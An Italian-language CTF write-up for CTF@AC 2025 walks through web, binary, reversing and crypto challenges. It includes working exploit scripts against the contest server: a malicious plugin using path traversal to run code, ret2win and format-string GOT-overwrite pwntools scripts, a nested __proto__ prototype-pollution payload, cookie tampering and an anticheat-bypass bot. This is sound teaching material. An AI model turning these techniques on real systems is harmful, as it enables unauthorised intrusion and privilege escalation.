---
title: "CTF@AC 2025"
date: 2025-09-16T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["ctfatac", "ctf", "binary", "crypto", "web", "ctfatac2025"]
author: "Paolo"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "Alcune writeup della ctf CTF@AC edizione 2025."
canonicalURL: "https://pascalctf.github.io/en/ctf/"
disableHLJS: false
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/PascalCTF/PascalCTF.github.io" # image path/url
    alt: "CTF@AC 2025" # alt text
    caption: "Alcune writeup della ctf CTF@AC edizione 2025." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/PascalCTF/PascalCTF.github.io/blob/main/content/en"
    Text: "Suggerisci delle modifiche" # edit text
    appendFilePath: true # to append file path to Edit link
---

# CTF@AC 2025

![ctf at ac logo](/images/ctf@ac.png)

## Web 🌐

### money

#### Analisi

La challenge espone una dashboard minimale che supporta plugin di terze parti. Quando carichiamo un plugin, la piattaforma ci permette anche di scaricare quelli esistenti (incluso l’ufficiale `flag.plugin`).

#### Exploit

Dopo aver scaricato `flag.plugin`, notiamo che è cifrato. Il file `server.py` contiene sia la chiave sia la funzione per decifrarlo, quindi possiamo decifrarlo in locale usando `decrypt_file`.

```python
KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"

def decrypt_file(input_path, output_path, key):
    with open(input_path, "rb") as f:
        data = f.read()
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    with open(output_path, "wb") as f:
        f.write(plaintext)
```

Il `init.py` del `flag.plugin` decifrato contiene il seguente codice:

```python
import json, sqlite3, pathlib, time, uuid
import os
plugin_dir = pathlib.Path(__file__).resolve().parent
manifest_path = plugin_dir / "plugin_manifest.json"
name, version = "Widget", "1.0.0"
if manifest_path.exists():
    try:
        m = json.loads(manifest_path.read_text())
        name = m.get("name", name)
        version = m.get("version", version)
    except Exception:
        pass


thumb = thumb = f'''<svg xmlns="http://www.w3.org/2000/svg" width="320" height="180">
<rect x="0" y="0" width="320" height="180" fill="#eef"/>
<text x="50%" y="50" dominant-baseline="middle" text-anchor="middle"
      font-size="48" font-family="sans-serif">🚩</text>
<text x="50%" y="110" dominant-baseline="middle" text-anchor="middle"
      font-size="16" font-family="sans-serif" fill="#444">v{version}</text>
</svg>'''
(plugin_dir / "thumbnail.svg").write_text(thumb)

flag = os.getenv("FLAG","You ran this locally and did not set a dummy flag, dummy.")
print("You cannot see this MUHAHAHAHA:" + flag)
```

In breve, `init.py` stampa la flag su stdout quando viene eseguito. Il server esegue l’`init.py` di un plugin durante l’upload (`/upload`). L’idea è sfruttare questo comportamento da un altro plugin:

* Per prima cosa, dobbiamo scoprire l’UID lato server del widget `flag`, così da conoscerne il nome della directory.
* Poi, dobbiamo creare un plugin malevolo il cui `init.py` usi un path traversal relativo (`../{uid}/init.py`) per eseguire l’`init.py` del flag plugin tramite `subprocess` e catturarne lo stdout.
* Infine, scrivere quello stdout in `index.html`, che la piattaforma ci renderizzerà.

Perché l’exploit funzioni in modo affidabile, usare la struttura di cartelle seguente.

#### Struttura delle cartelle dell’exploit

```text
.
├── plug
│   ├── icon.png (vuoto)
│   ├── init.py
│   └── plugin_manifest.json
└── solve.py
```

##### Soluzione in Python

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os, requests, bs4, subprocess

PORT = 9035
URL = 'http://ctf.ac.upt.ro:' + str(PORT) + '/'

s = requests.Session()

soup = bs4.BeautifulSoup(s.get(URL).text, "html.parser")
img = soup.find("img", alt="Flag")
flag = img["src"].split("/")[2]

print("Flag uid:", flag)

exploit = f"""
import subprocess

result = subprocess.run(['python', '../{flag}/init.py'], capture_output=True, text=True)
with open('index.html', 'w') as f:
    f.write(result.stdout)
"""
with open("plug/init.py", "w") as f:
    f.write(exploit)

subprocess.run(['zip', '-r', '../plug.zip', '.'], check=True, cwd='plug')

KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"

with open("plug.zip", "rb") as f:
    data = f.read()

iv = os.urandom(16)
cipher = AES.new(KEY, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(pad(data, AES.block_size))

with open("myplugin.plugin", "wb") as f:
    f.write(iv + ciphertext)

s.post(URL + 'upload', files={"file": open("myplugin.plugin", "rb")})

soup = bs4.BeautifulSoup(s.get(URL).text, "html.parser")
img = soup.find("img", alt="My exploit")

widget = img["src"].split("/")[2]

print("Widget uid:", widget)
print(s.get(URL + 'widget/' + widget).text)
```

#### Plugin

**`init.py`**

```python
import subprocess

result = subprocess.run(['python', '../flag-uid-goes-here/init.py'], capture_output=True, text=True)
with open('index.html', 'w') as f:
    f.write(result.stdout)
```

**`plugin_manifest.json`**

```json
{
  "name": "My exploit",
  "version": "1.0",
  "author": "hecker",
  "icon": "icon.png"
}
```

### Random Gallery

#### Riepilogo della challenge

Random Gallery è una web challenge basata su un semplice difetto di autenticazione.
Visitando il sito si vede una pagina di login, ma non c’è alcuna opzione di registrazione—quindi sembra impossibile autenticarsi.

Ispezionando i cookie del browser, si nota un cookie `logged_in` impostato a `false`.
Se cambi manualmente questo valore in `true` e vai alla index (`/`), ottieni accesso al sito.

Una volta dentro, esplora un po’ e ti imbatterai in un QR code:

<img src="/images/randomgallery.png" alt="QR code" width="250"/>

Scansiona il QR code per ottenere la flag.

### Theme-Generator

Theme-Generator è una web app che consente agli utenti di caricare e unire preset JSON per personalizzare temi. L’applicazione include difese contro la prototype pollution e limita alcune azioni sensibili ai soli utenti admin.

La prototype pollution è una vulnerabilità subdola e pericolosa che colpisce le applicazioni JavaScript. Si verifica quando un attacker può iniettare proprietà nel prototype globale di JavaScript (`Object.prototype`). Poiché tutti gli oggetti ereditano da questo prototype, inquinarlo può avere effetti molto ampi, potenzialmente consentendo escalation di privilegi o alterazioni inattese del comportamento dell’app.

In questa challenge, gli sviluppatori hanno provato a difendersi bloccando eventuali chiavi di primo livello chiamate `__proto__`, `prototype` o `constructor` nei dati JSON in ingresso:

```javascript
for (const k of Object.keys(data)) {
    if (["__proto__", "prototype", "constructor"].includes(k)) {
        return res.status(400).send('blocked');
    }
}
```

A prima vista, sembra una difesa ragionevole. Tuttavia, il controllo ispeziona solo le chiavi di primo livello dell’oggetto inviato. Se un attacker annida una chiave malevola più in profondità, il filtro viene bypassato. Ad esempio, inviando il seguente payload:

```json
{ "user": { "__proto__": { "isAdmin": true } } }
```

si introduce di nascosto la proprietà `__proto__` nel prototype dell’oggetto, impostando `isAdmin` a `true` per tutti gli oggetti. Questo conferisce di fatto privilegi di admin all’attacker.

Con accesso admin, è poi possibile effettuare una richiesta all’endpoint `/admin/flag` e recuperare la flag. Questa challenge evidenzia l’importanza di una validazione profonda quando si trattano oggetti forniti dall’utente in JavaScript, specialmente durante merge.

## Binary exploitation 🏴‍☠️

### Sigdance

#### Analisi del codice

La challenge consiste in due file C: `main.c` e `plugin.c`.

##### `main.c`

Questo file contiene la logica principale del programma. Le sue azioni chiave sono:

* Imposta signal handler per `SIGALRM` e `SIGUSR1`.
* Usa `setitimer` per generare segnali `SIGALRM` a intervalli regolari (ogni 7 ms).
* Crea un nuovo thread che invia ripetutamente segnali `SIGUSR1` al processo principale (ogni 5 ms).
* Chiama `nanosleep` per 777 millisecondi.
* Carica dinamicamente la libreria condivisa `libcore.so` e chiama la funzione `verify`.
* Il programma legge l’input dell’utente e lo passa a `verify`. Se `verify` restituisce true, stampa la flag.

##### `plugin.c`

Questo file viene compilato in `libcore.so` e contiene la funzione `verify`.

```c
#include <stdint.h>

int verify(uint32_t provided, uint32_t ac, uint32_t uc, uint32_t pid) {
  uint32_t token = ((ac << 16) ^ (uc << 8) ^ (pid & 255u));
  return provided == token;
}
```

La funzione `verify` calcola un `token` basato su tre valori:

* `ac`: il conteggio dei segnali `SIGALRM` ricevuti.
* `uc`: il conteggio dei segnali `SIGUSR1` ricevuti.
* `pid`: gli 8 bit meno significativi del process ID.

Per risolvere la challenge, dobbiamo predire i valori di `ac` e `uc` e fornire il token corretto.

#### La vulnerabilità

La vulnerabilità principale risiede nell’interazione tra `nanosleep` e i segnali.

La `main` chiama `nanosleep` per 777 ms. Tuttavia, non controlla il valore di ritorno di `nanosleep`. Secondo la man page di `nanosleep`, se il sonno è interrotto da un segnale, la funzione ritorna `-1` e imposta `errno` a `EINTR`.

In questo programma, due segnali diversi vengono generati in parallelo:

1. `SIGALRM` è schedulato per scattare ogni 7 ms.
2. Il thread separato invia `SIGUSR1` ogni 5 ms.

Poiché `SIGUSR1` arriva per primo (dopo 5 ms), interrompe la chiamata a `nanosleep`. L’esecuzione prosegue immediatamente senza dormire per l’intera durata.

Crucialmente, la riga che disabilita il timer `SIGALRM` si trova *dopo* la `nanosleep`:

```c
setitimer(ITIMER_REAL, &(struct itimerval){0}, NULL);
```

Dato che `nanosleep` viene interrotta prima che il primo `SIGALRM` (7 ms) possa scattare, il timer viene disabilitato e l’handler di `SIGALRM` non viene mai chiamato.

Il programma quindi attende che il thread che invia `SIGUSR1` completi il suo loop, inviando in totale 13 segnali.

Questo significa che i conteggi finali saranno sempre:

* `ac = 0`
* `uc = 13`

#### La soluzione

Con valori di `ac` e `uc` prevedibili, possiamo creare un semplice programma per calcolare il token richiesto.

**`solver.c`**

```c
// gcc -o solver solver.c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    fprintf(stderr, "Usage: %s <pid8>\n", argv[0]);
    return 1;
  }

  uint32_t pid8 = strtoul(argv[1], NULL, 0);
  uint32_t ac = 0;
  uint32_t uc = 13;

  uint32_t token = ((ac << 16) ^ (uc << 8) ^ pid8);

  printf("%u\n", token);

  return 0;
}
```

**`solve.py`**

```python
from pwn import *
import subprocess

r = remote("ctf.ac.upt.ro", 9749)

r.recvuntil(b'= ')
pid = int(r.recvline().strip())
log.info(f"PID: {pid}")

res = subprocess.run(['./solver', str(pid)], check=True, capture_output=True).stdout.decode()

r.sendline(res)
print(r.recvall().decode())
```

### baby-bof

**baby-bof** è una pwn challenge per principianti che introduce una delle vulnerabilità più classiche: il **Buffer Overflow**.

#### Panoramica della challenge

Il codice decompilato (es. da IDA) mostra che l’eseguibile legge `0x100` byte in un buffer di soli 64 byte:

![Decompiled code showing buffer overflow](/images/babybof.png)

Questo permette di scrivere oltre la fine del buffer e sovrascrivere lo *stack*, incluso il return address. In questo modo possiamo reindirizzare l’esecuzione a qualsiasi funzione vogliamo—nel nostro caso, la funzione `win()`.
Questa tecnica è comunemente chiamata **ret2win**.
Per maggiori dettagli, vedi [questa guida](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win).

#### Exploit

Ecco lo script di exploit:

```python
from pwn import *

elf = context.binary = ELF('./challenge')
context.terminal = []

if args.REMOTE:
    p = remote('ctf.ac.upt.ro', 9806)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b rww
        c
    ''')
else:
    p = elf.process()

# 64 bytes buffer + 8 bytes saved RBP = 72 bytes per raggiungere il return address
payload = b'A' * 72 + p64(elf.symbols.win)
p.sendlineafter(b':\n', payload)
p.interactive()
```

**Spiegazione:**

* Il payload overflowa il buffer e sovrascrive il return address con l’indirizzo di `win()`.
* Lo script funziona in locale, con GDB o in remoto.

### fini

**fini** è il primo task pwn davvero impegnativo della serie. Qui dobbiamo sfruttare una vulnerabilità più avanzata nota come **format string bug**.

#### Individuare la vulnerabilità

La vulnerabilità è evidente se conosci i format string bug.
Nel codice decompilato (vedi immagine), il programma chiama `printf()` **senza** specificare una format string, tipo `%s`:

![Decompiled code showing vulnerable printf](/images/fini.png)

Questo significa che l’input dell’utente viene passato direttamente a `printf`, permettendoci di controllare la format string e di leakare valori dallo stack o scrivere in memoria arbitraria.

Inoltre, il programma offre una funzionalità che permette di scrivere qualsiasi valore in qualunque indirizzo—utile per l’exploit.

#### Sfruttare la vulnerabilità

Poiché `printf` è chiamata senza format string, possiamo inviare i nostri specifier. Ad esempio, inviando `%p` verrà stampato un indirizzo dello stack.
Se inviamo un payload come `%p.%p.%p.%p.%p.%p.%p.%p.`, il programma stamperà diversi indirizzi dello stack in ordine, separati da punti.
Questo aiuta a visualizzare il layout dello stack e a trovare quale offset corrisponde a valori interessanti (come il return address o i function pointer).
Puoi aumentare il numero di `%p` per stampare più valori, o usare GDB per ispezionare lo stack e contare quanti `%p` servono per raggiungere un valore specifico.

Sperimentando, scopriamo che `%50$p` leaka l’indirizzo di `main`.
Questo ci permette di calcolare la base dell’eseguibile (PIE).

Poi usiamo la funzione di write-anywhere del programma per sovrascrivere la voce **GOT** di `printf` con l’indirizzo di `win()`.
In questo modo, quando `printf` verrà chiamata di nuovo, in realtà salterà a `win()` e ci darà la flag.

#### Script di exploit

```python
from pwn import *

elf = context.binary = ELF('./challenge')
context.terminal = []

if args.REMOTE:
    p = remote('ctf.ac.upt.ro', 9777)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b main
        c
    ''')
else:
    p = elf.process()

# Leak dell’indirizzo di main tramite la format string vulnerability
p.sendlineafter(b'?\n', b'%50$p')
p.recvuntil(b', ')
main = int(p.recvline().strip(), 16)
print(f'Main address: {hex(main)}')

# Calcolo della base PIE
elf.address = main - elf.symbols.main
print(f'Base address: {hex(elf.address)}')

# Usa la funzione del programma per sovrascrivere printf@GOT con win()
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', hex(elf.got.printf).encode())
p.sendlineafter(b': ', hex(elf.symbols.win).encode())

# Ottieni la flag!
p.interactive()
```

#### Riepilogo

* La vulnerabilità è un classico format string bug dovuto a una `printf` insicura.
* Usiamo il leak dell’indirizzo di `main` per battere PIE.
* Sovrascriviamo la voce GOT di `printf` con l’indirizzo di `win()`.
* Alla successiva `printf`, l’esecuzione salta a `win()` e otteniamo la flag.

### Minecrafty

Questa challenge include un **server Minecraft in Go** personalizzato (modifica di `go-mc/server`) e un file di “hint”, **`message.txt`**, contenente un bot Node.js che parla il protocollo di Minecraft. L’obiettivo era far sì che il server stampasse la flag in chat.

Idea di base: il comando chat **`!flag`** verifica le tue coordinate **esatte** XYZ e restituisce la flag reale solo se stai in **(69420, 69420, 69420)**. Il movimento è rate-limited, ma non abbastanza da impedire a un bot di camminare lì a piccoli passi.

#### Cosa c’è di interessante nel server

**1. Il gate del comando chat**

In `server/game/chat.go`, il server ispeziona la chat in ingresso. Quando il messaggio è `!flag`, legge la `Position` corrente del player e la confronta con `(69420, 69420, 69420)`. Se non sei lì, ti trolla con un decoy:

```go
switch string(message) {
case "!flag":
    x := int32(player.Position[0])
    y := int32(player.Position[1])
    z := int32(player.Position[2])

    if x != 69420 || y != 69420 || z != 69420 {
        c.SendPlayerChat(
            player.UUID, 0, signature,
            &sign.PackedMessageBody{
                PlainMsg: fmt.Sprintf(
                    "ctf{try_harder}  Your Position: %d %d %d  Expected Position: 69420 69420 69420",
                    x, y, z),
                Timestamp: timestamp, Salt: int64(salt),
                LastSeen: []sign.PackedSignature{},
            },
            nil, &sign.FilterMask{Type: 0}, &chatType,
        )
    } else {
        c.SendPlayerChat(
            player.UUID, 0, signature,
            &sign.PackedMessageBody{
                PlainMsg: "ctf{redacted}",
                Timestamp: timestamp, Salt: int64(salt),
                LastSeen: []sign.PackedSignature{},
            },
            nil, &sign.FilterMask{Type: 0}, &chatType,
        )
    }
```

**2. La soglia dell’anticheat**

In `server/world/tick.go`, il server controlla quanto ti sei mosso tra due update. Se un singolo step è **oltre 100 blocchi**, ti teletrasporta indietro (classico “moved too quickly”). Qualsiasi cosa **≤ 100** viene accettata:

```go
delta := [...]float64{
    inputs.Position[0] - p.Position[0],
    inputs.Position[1] - p.Position[1],
    inputs.Position[2] - p.Position[2],
}
distance := math.Sqrt(delta[0]*delta[0] + delta[1]*delta[1] + delta[2]*delta[2])
if distance > 100 {
    teleportID := c.SendPlayerPosition(p.Position, p.Rotation)
    p.teleport = &TeleportRequest{ ID: teleportID, Position: p.Position, Rotation: p.Rotation }
} else if inputs.Position.IsValid() {
    p.pos0 = inputs.Position
    p.rot0 = inputs.Rotation
    p.OnGround = inputs.OnGround
}
```

**3. Offline mode**

Il `server/config.toml` incluso abilita gli accessi offline:

```toml
online-mode = false
enforce-secure-profile = false
listen-address = "0.0.0.0:25565"
```

Per questo un semplice bot “protocol” può connettersi con `auth: 'offline'`.

#### Soluzione

Dato quanto sopra, risolvere si riduce a:

1. **Connettersi in offline mode** al server.
2. **Camminare** fino a `(69420, 69420, 69420)` usando hop **≤ 100 blocchi** per update così che il server accetti la posizione.
3. **Inviare `!flag`** e catturare qualunque chat che contenga `ctf{`.

Il `message.txt` fornito include già un exploit Node funzionante con **mineflayer** e **vec3** che fa esattamente questo: connette offline, avanza verso la destinazione con un limite per-step (conservativo **50** ≤ 100), poi invia `!flag` e stampa ogni chat contenente `ctf{`.

Uso minimale (dall’header dell’exploit):

```bash
npm i mineflayer vec3
node exploit_flag.js --host <SERVER_IP> --port 25565 --name Flaggy
```

Idee chiave nel bot:

* **Passi limitati** per bypassare il check >100:

```js
const MAX_STEP = 50
function stepTowards(cur, dst, maxStep) {
  const dx = dst.x - cur.x, dy = dst.y - cur.y, dz = dst.z - cur.z
  const dist = Math.hypot(dx, dy, dz)
  if (dist === 0) return cur
  if (dist <= maxStep) return dst
  const s = maxStep / dist
  return new Vec3(cur.x + dx*s, cur.y + dy*s, cur.z + dz*s)
}
```

* **Pacchetti di posizione raw** ogni \~200 ms per aggiornare la posizione senza pathfinding.
* All’arrivo, **invia `!flag`** e **greppa la chat** per `ctf{`.

Una volta posizionato **esattamente** a `(69420, 69420, 69420)`, l’handler del `!flag` prende il ramo `else` e risponde con la flag reale in chat.

```js
#!/usr/bin/env node
const mineflayer = require('mineflayer')
const { Vec3 } = require('vec3')
/* ... (codice invariato come nell’originale) ... */
```

## Reverse engineering ⚙️

### Pythonese

Questa challenge forniva un dump di **bytecode Python** grezzo e chiedeva di recuperare la flag prodotta a runtime.

A prima vista, il file importa molti moduli (`hashlib`, `base64`, `marshal`, `asyncio`, ecc.) e riempie `__doc__`/`__annotations__` con Base64 casuale per fare rumore. C’è anche un anti-RE che cerca moduli di reverse engineering e debugger. Ignoriamo quelle parti e ci concentriamo sul control flow.

Mappando le funzioni (`f0...f16`), vediamo che l’entrypoint (`f16`) legge una stringa di input `i`, costruisce una piccola “VM” (via `compile` + `marshal`) che espone `run(...)`, e poi **stampa il valore di ritorno di `run(...)`**. Il punto cruciale è come `run` è costruita in `f15`: incapsula una stringa costante `r` composta da `f13`, quindi la flag stampata è interamente determinata da `f13`.

Dentro `f13` troviamo due interi derivati dall’input:

* `k1 = int(i[:4])`
* `k2 = int(i[4:6])`

Un helper annidato (`fvdy`) decodifica poi diverse array di interi (concettualmente `a, b, c, d, e, f, g, h, i`) in caratteri usando questa trasformazione per elemento:

```
ch = chr( (((v >> 1) + k2) ^ (k1 & 0xFF)) & 0xFF )
```

Una volta decodificate le array, `f13` assembla la stringa finale `r` come:

1. la decodifica di `a` (usata come **prefisso**),
2. le altre parti riordinate da una permutazione fissa `P = (3, 6, 1, 7, 0, 5, 2, 4)`,
3. un singolo carattere **suffisso**.

Per risolvere, imponiamo il prefisso naturale `a == "CTF{"` e risolviamo le congruenze lineari (mod 256) sui primi caratteri di `a`. Questo inchioda:

* `k1 ≡ 81 (mod 256)` (qualunque `k1` a 4 cifre che dia `81` modulo 256 va bene, es. `1105`)
* `k2 = 83`

Con `k1, k2` fissati, decodificando e assemblando `a + parti_permutate + suffisso` si ottiene l’intera flag. Qualsiasi input le cui prime 6 cifre soddisfano quei vincoli fa stampare la flag (es. `110583...`; il resto non importa).

#### Flag

```
CTF{2944cec0c0f401a5fa538933a2f6210c279fbfc8548ca8ab912b493d03d2f5bf}
```

### Ironevil

#### La challenge

Il binario fornito nella challenge, chiamato `ironveil`, è un eseguibile ELF 64-bit PIE compilato per Linux e collegato a un loader NixOS. Poiché il percorso dell’interprete indicato nel binario punta a una posizione non standard, il programma non può essere eseguito direttamente su un sistema tipico. È per questo che, lanciandolo da shell, compare l’errore “cannot execute: required file not found.” In pratica, la soluzione è specificare manualmente il loader del sistema, di solito `/lib64/ld-linux-x86-64.so.2`, per poter eseguire il programma.

Il codice decompilato mostra che, prima di qualsiasi operazione di cifratura, il programma dedica molto tempo all’inizializzazione. Imposta gestori di segnali, esegue controlli con `poll` sui descrittori di file e interagisce con `/dev/null`. Inoltre interroga attributi dei thread, come indirizzo e dimensione dello stack, e li riallinea con precisione. Queste procedure sono tipiche di binari resi più resistenti a tecniche di debugging o all’esecuzione in sandbox. Una volta completata l’inizializzazione, però, la logica si riduce a un comportamento piuttosto semplice: il programma si aspetta un file come input e produce un output cifrato con il suffisso `.encrypted`.

La routine di cifratura è basata su una macchina virtuale personalizzata. Questa VM interpreta trentadue opcode per generare uno stream di byte che funge da chiave. Lo stream viene poi applicato al file in input con un’operazione di XOR byte per byte. Ogni byte di plaintext viene combinato con il corrispondente byte della chiave e il risultato viene scritto su disco. Il dettaglio cruciale è che la VM è deterministica: lo stesso binario produce sempre lo stesso keystream. Non esiste alcun seed casuale, nonce o variazione per file. Ciò significa che la trasformazione è semplicemente `ciphertext = plaintext ⊕ key`. Applicare la trasformazione due volte con la stessa chiave la annulla, perché `(P ⊕ K) ⊕ K = P`.

#### La soluzione

La challenge ci metteva a disposizione soltanto il binario e un file già cifrato, `flag.txt.encrypted`. La soluzione pensata dagli autori probabilmente era quella di invertire la VM, studiarne le trentadue istruzioni e rigenerare lo stream di chiave per decifrare manualmente il ciphertext. Tuttavia, la natura deterministica dell’algoritmo offriva una via molto più semplice. Dando in pasto al programma il file già cifrato, lo stesso keystream veniva applicato di nuovo. Di conseguenza, la doppia cifratura si annullava e restituiva il plaintext originale.

Eseguendo il binario tramite il loader di sistema con il file cifrato come input veniva generato un nuovo file, `flag.txt.encrypted.encrypted`. Aprendolo si poteva vedere immediatamente la flag in chiaro all’inizio del file. Il resto conteneva byte spazzatura, coerenti con l’operazione XOR che prosegue oltre la flag su dati inutilizzati o irrilevanti. Ma la presenza della flag completa all’inizio era sufficiente per risolvere la challenge.

#### Note finali

La debolezza di sicurezza qui risiede proprio nel riutilizzo di uno stream di chiave statico. Nella crittografia reale, i cifrari a flusso sono sicuri solo se ogni cifratura usa un nonce o un vettore di inizializzazione univoco, così da garantire che lo stream non si ripeta mai. In assenza di questa misura, il cifrario si riduce a un insicuro “many-time pad”, in cui l’uso ripetuto dello stesso keystream porta inevitabilmente a perdite di informazione. In questo caso, la falla era talmente grave che una semplice doppia esecuzione del binario invertiva la trasformazione ed esponeva direttamente la flag in chiaro.

La challenge quindi poteva essere risolta in pochi secondi senza comprendere affatto il funzionamento della macchina virtuale, semplicemente ri-cifrando il ciphertext fornito. Il risultato inatteso ma valido è stato il recupero della flag:

### Pixel Gate

Questa challenge includeva un eseguibile Go `challenge` strip-pato e uno script helper `gen.py`. Il binario si aspetta un PNG con un formato molto specifico e stampa i contenuti solo se tutte le validazioni interne vanno a buon fine. Facendo reverse del build Go RISC-V64 troviamo un parser PNG volutamente minimale e fatto a mano, i cui vincoli sono rispecchiati esattamente dallo script generatore.

#### L’algoritmo

Il file deve iniziare con la firma PNG a 8 byte. Subito dopo, un chunk `IHDR` con payload di 13 byte che codifica ampiezza 1337, altezza 1, bit depth 8 e color type 2 (truecolor), mentre i byte di compressione, filtro e interlacciamento sono tutti zero. (Il path ammette anche color type 6, ma lo script usa 2 per semplicità.) Ogni chunk subisce la verifica CRC32 standard calcolata su `type || data`. Dopo `IHDR`, il programma si aspetta un chunk `tEXt` i cui dati sono divisi sul primo NUL: una key da 15 byte seguita da un value da 17 byte. Questi vengono confrontati byte-per-byte con costanti embeddate: key `6ee494848e978ea` e value `d50bc687e6e14f8f8`. Deve apparire anche un chunk ancillare personalizzato `raRE` con payload di 18 byte uguale (come ASCII raw, non decodificato) a `2b6b2c6ba2912d219d`. È richiesto almeno un `IDAT` ma il contenuto non viene mai decompresso; è accettato vuoto perché si controllano solo presenza e CRC. Infine un `IEND` chiude lo stream. Internamente il parser mantiene flag per: firma valida, `IHDR` ok, coppia key/value corretta, payload `raRE` corretto, visto almeno un `IDAT`, e `IEND` incontrato. Solo se tutti sono veri il programma riapre il file e dumpa i byte grezzi su stdout.

#### Soluzione

Ricostruire un file valido si riduce a un’assemblaggio lineare: emettere la firma PNG, costruire l’`IHDR` esatto, forgiare i byte del `tEXt` come key + NUL + value, aggiungere il payload fisso `raRE`, includere un `IDAT` vuoto, e chiudere con `IEND`, assicurandosi che ogni CRC32(type||data) corrisponda. L’ordine usato dall’helper—IHDR → tEXt → raRE → IDAT → IEND—soddisfa le dipendenze e mantiene l’immagine minimale.

Lo `gen.py` automatizza questi passi e scrive `pass.png`:

##### Generatore PNG in Python

```py
import struct, zlib

def chunk(typ: str, data: bytes = b"") -> bytes:
    typb = typ.encode("ascii")
    crc = zlib.crc32(typb + data) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + typb + data + struct.pack(">I", crc)

def build_png() -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", 1337, 1, 8, 2, 0, 0, 0)
    text_key = b"6ee494848e978ea"
    text_val = b"d50bc687e6e14f8f8"
    text_data = text_key + b"\x00" + text_val
    rare_data = b"2b6b2c6ba2912d219d"
    idat_data = b""  # empty accepted
    return b"".join([
        sig,
        chunk("IHDR", ihdr),
        chunk("tEXt", text_data),
        chunk("raRE", rare_data),
        chunk("IDAT", idat_data),
        chunk("IEND", b""),
    ])

if __name__ == "__main__":
    data = build_png()
    with open("pass.png", "wb") as f:
        f.write(data)
    print(f"Wrote pass.png ({len(data)} bytes)")
```

#### Note finali

Le stringhe che sembrano esadecimali non vengono mai interpretate—il confronto avviene sui byte ASCII letterali. Consentire il color type 6 qui non aggiunge valore, quindi il type 2 evita complicazioni su palette e alpha. Poiché non avviene decompressione, un `IDAT` vuoto basta. Qualunque deviazione—lunghezze errate, costante alterata, chunk mancante o CRC non corrispondente—provoca l’aborto prima dell’output. Il risultato è un PNG volutamente minuscolo e deterministico, usato come “token” di accesso.

## Cryptography 🔑

### Repeated RSA

#### Riepilogo della challenge

Ci vengono dati tre moduli RSA (`n1`, `n2`, `n3`), tutti con lo stesso esponente `e = 65537`. Il ciphertext è il risultato di tre cifrature in sequenza, ogni volta con un modulo diverso:

```
c = (((m^e mod n1)^e mod n2)^e mod n3)
```

A prima vista sembra sicuro, ma se i moduli condividono fattori, è finita.

#### Outline della soluzione

Il trucco è calcolare `gcd(n1, n2)`, `gcd(n1, n3)` e `gcd(n2, n3)`. Se due moduli condividono un primo, possiamo fattorizzare tutti e tre. Una volta fattorizzati, costruiamo le chiavi private e decifriamo in ordine inverso: prima con `n3`, poi `n2`, quindi `n1`.

#### Flag

Dopo aver eseguito lo script, otteniamo:

```
ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
```

#### Script

```python
from math import gcd
from Crypto.Util.number import long_to_bytes, inverse
# ... (codice invariato come nell’originale) ...
```

### SSS

Questa challenge fornisce tre grandi blob esadecimali chiamati `P1`, `P2` e `P3`:

* `P1="8010ba0d6ed3..."`
* `P2="80264e325aa0..."`
* `P3="8036f43f3473..."`

La descrizione (“Shamir sarà orgoglioso”) suggerisce **Shamir’s Secret Sharing (SSS)**. Con tre allegati e nessun altro parametro, l’impostazione più naturale è uno schema **3-di-3** su GF(\$2^8\$), dove dobbiamo ricostruire il segreto.

#### Cosa sono gli allegati

Ogni `P*` è una **share** codificata in hex. Prima della matematica conviene guardare la struttura:

* Tutti e tre iniziano con `0x80` seguito da un byte variabile (`0x10`, `0x26`, `0x36`).
* Dopo i **primi 2 byte**, i rimanenti hanno **stessa lunghezza** in ogni blob.

Questo suggerisce un piccolo **header/metadata** da 2 byte (comune in formati di share) seguito dal **payload** della share (i valori y di un punto Shamir). Non ci serve la metadata per ricostruire il segreto, quindi possiamo scartare quei due byte e lavorare sui body allineati.

#### L’idea chiave

La ricostruzione di Shamir in \$x=0\$ usa l’interpolazione di Lagrange. Se le tre share sono in \$x\in{1,2,3}\$ (scelta comune), in campi di caratteristica 2 (come GF(2⁸)) i coefficienti di Lagrange in \$x=0\$ risultano **1, 1, 1**:

$$
\lambda_1=\frac{(0-2)(0-3)}{(1-2)(1-3)}=\frac{(2)(3)}{(3)(2)}=1,\quad
\lambda_2=\frac{(0-1)(0-3)}{(2-1)(2-3)}=\frac{(1)(3)}{(1)(3)}=1,\quad
\lambda_3=\frac{(0-1)(0-2)}{(3-1)(3-2)}=\frac{(1)(2)}{(2)(1)}=1.
$$

In caratteristica 2, l’addizione è XOR. Quindi il segreto in \$x=0\$ è semplicemente lo **XOR byte-a-byte** dei tre payload:

$$
\text{secret} = y_1 \oplus y_2 \oplus y_3.
$$

(Se sei scettico sui punti campionati, il test più rapido è provare lo XOR: se esce qualcosa di sensato, fatto. E infatti funziona. 🙂)

#### Recupero del segreto

1. **Parsa hex**, **scarta i primi 2 byte** (header) di ciascuna share.
2. **XOR** dei tre body byte-per-byte.
3. Ispeziona il risultato:

   * Il pattern dei byte è `00 63 00 74 00 66 ...`, ovvero **UTF-16BE**.
